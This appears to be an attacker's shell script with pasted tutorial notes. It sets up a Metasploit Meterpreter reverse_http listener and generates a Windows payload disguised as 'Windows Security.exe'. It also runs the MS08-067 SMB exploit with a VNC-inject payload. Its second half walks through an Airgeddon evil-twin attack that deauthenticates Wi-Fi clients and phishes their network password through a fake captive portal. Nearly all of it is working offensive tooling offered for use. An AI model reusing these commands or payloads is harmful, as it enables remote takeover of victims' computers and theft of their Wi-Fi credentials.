#####################
# dwnld metasploit install script
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb >msfinstall

# Ensure the file has adequate permissions to execute
sudo chmod 755 msfinstall
# run created "msfinstall" file as root to install Metasploit.
sudo ./msfinstall

######
#####
##### install 'screen'
sudo apt-get install screen -y
# To view current Screen sessions:
# screen -list
# To start a new Screen session
# screen
# Once inside the session, everything will be preserved — even if you close the terminal window or shut down your computer.
# The -r argument can be used to reconnect to a running Screen session.
# screen -r SESSION-NAME-HERE

read -p "what attackIP?" IP
#  create a resource script
printf 'use multi/handler\nset payload windows/meterpreter/reverse_http\nset LHOST $IP\nset LPORT 80\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n' >~/automate.rc

#  Msfconsole can now be started using the below command.
screen msfconsole -r ~/automate.rc

# to generate the Msfvenom created in this tutorial. To generate a payload using Msfvenom, type the below command into a terminal.
msfvenom --encoder cmd/powershell_base64 --payload windows/meterpreter/reverse_http LHOST=$IP LPORT=80 --arch x86 --platform win --format exe --out ~/'Windows Security.exe'

################# SEE: null-byte.wonderhowto.com/how-to/hack-like-pro-save-world-from-nuclear-annihilation-0146216/
msf >use exploit/windows/smb/ms08_067_netapi
# VNC SERVER PAYLOAD
msf >set PAYLOAD payload/windows/vncinject/reverse_tcp
# set the RHOST (victim's) and LHOST (our) IP addresses
msf >exploit



## AIRGEDDON FOR WIFI MITM PASSWORD AQUISITION
######################### SEE: 
apt-get install ccze -y
git clone github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash ./airgeddon.sh
# ensure all modules are installed... esp dnsspoof
#       Next, the script will check for internet access so it can update itself if a newer version exists. When this is done, press enter to select the network adapter to use.
#       After we select our wireless network adapter, we'll proceed to the main attack menu.
#       Press 2 to put your wireless card into monitor mode. 
        #       Next, select option 7 for the "Evil Twin attacks" menu, and you'll see the submenu for this attack module appear.
#       Select the Target
#       Now that we're in our attack module, select option 9 for the "Evil Twin AP attack with a captive portal." We'll need to explore for targets, so press enter, and you'll see a window appear that shows a list of all detected networks. You'll need to wait for a little to populate a list of all the nearby networks.
#       After this runs for about 60 seconds, exit out of the small window, and a list of targets will appear. You'll notice that networks with someone using them appear in yellow with an asterisk next to them. This is essential since you can't trick someone into giving you the password if no one is on the network in the first place.
#       Select the number of the target you wish to attack, and press enter to proceed to the next screen.

        Gather the Handshake    ... Now, we'll select the type of de-authentication attack we want to use to kick the user off their trusted network. I recommend the second option, "Deauth aireplay attack," but different attacks will work better depending on the network.  Press enter once you've made your selection, and you'll be asked if you'd like to enable DoS pursuit mode, which allows you to follow the AP if it moves to another channel. You can select yes (Y) or no (N) depending on your preference, and then press enter. Finally, you'll select N for using an interface with internet access. We won't need to for this attack, and it will make our attack more portable to not need an internet source.  
        Next, it will ask you if you want to spoof your MAC address during this attack. In this case, I chose N for "no."
        Now, if we don't already have a handshake for this network, we'll have to capture one now. Be VERY careful not to accidentally select Y for "Do you already have a captured Handshake file?" if you do not actually have a handshake. There is no clear way to go back in the script without restarting if you make this mistake.
        Since we don't yet have a handshake, type N for no, and press enter to begin capturing.
        Once the capture process has started, a window with red text sending deauth packets and a window with white text listening for handshakes will open. You'll need to wait until you see "WPA Handshake:" and then the BSSID address of your targeted network. In the example below, we're still waiting for a handshake.
        Once you see that you've got the handshake, you can exit out of the Capturing Handshakewindow. When the script asks you if you got the handshake, select Y, and save the handshake file. Next, select the location for you to write the stolen password to, and you're ready to go to the final step of configuring the phishing page.
        
        Set Up the Phishing Page        ....
        In the last step before launching the attack, we'll set the language of the phishing page. The page provided by Airgeddon is pretty decent for testing out this style of attack. In this example, we'll select 1 for English. When you've made your selection, press enter, and the attack will begin with six windows opening to perform various functions of the attack simultaneously.
        
        Capture Network Credentials
        With the attack underway, the victim should be kicked off of their network and see our fake one as the only seemingly familiar option. Be patient, and pay attention to the network status in the top right window. This will tell you when a device joins the network, allowing you to see any password attempts they make when they're routed to the captive portal.  
        When the victim joins your network, you'll see a flurry of activity like in the picture below. In the top-right corner, you'll be able to see any failed password attempts, which are checked against the handshake we gathered. This will continue until the victim inputs the correct password, and all of their internet requests (seen in the green text box) will fail until they do so.
        When the victim caves and finally enters the correct password, the windows will close except for the top-right window. The fake network will vanish, and the victim will be free to connect back to their trusted wireless network.
        The credentials should be displayed in the top-right screen, and you should copy and paste the password into a file to save, in case the script doesn't save the file correctly. This sometimes happens, so make sure not to forget this step or you might lose the password you just captured.
        After this, you can close the window, and close down the tool by pressing Ctrl + C. If we get a valid credential in this step, then our attack has worked, and we've got the Wi-Fi password by tricking the user into submitting it to our fake AP's phishing page!
